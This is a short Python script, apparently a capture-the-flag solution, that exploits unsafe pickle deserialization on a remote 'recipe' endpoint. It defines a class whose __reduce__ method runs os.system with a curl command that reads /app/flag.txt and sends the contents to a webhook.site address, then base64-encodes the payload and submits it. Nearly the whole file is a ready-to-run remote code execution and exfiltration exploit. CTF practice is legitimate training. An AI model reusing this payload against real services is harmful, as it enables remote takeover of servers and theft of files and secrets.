import pickle
import pickletools
import requests
import base64


class PickleRCE(object):
    def __reduce__(self):
        import os
        return (os.system, (command,))


command = "curl https://webhook.site/c2ee487b-1429-416a-bdef-2f824cdb00d1?res=$(cat /app/flag.txt)"


def sploit(pickle):
    # encoded = base64.urlsafe_b64encode(pickle)
    encoded = pickle
    print(encoded)
    r = requests.get(
        f"http://tasks.mxkv.ru:31337/recipe",
        params={"recipe": encoded},
    )
    print(r.url)
    print(r.text)


if __name__ == "__main__":
    # print(pickletools.dis(payload))

    payload = base64.b64encode(pickle.dumps(PickleRCE()))
    sploit(payload)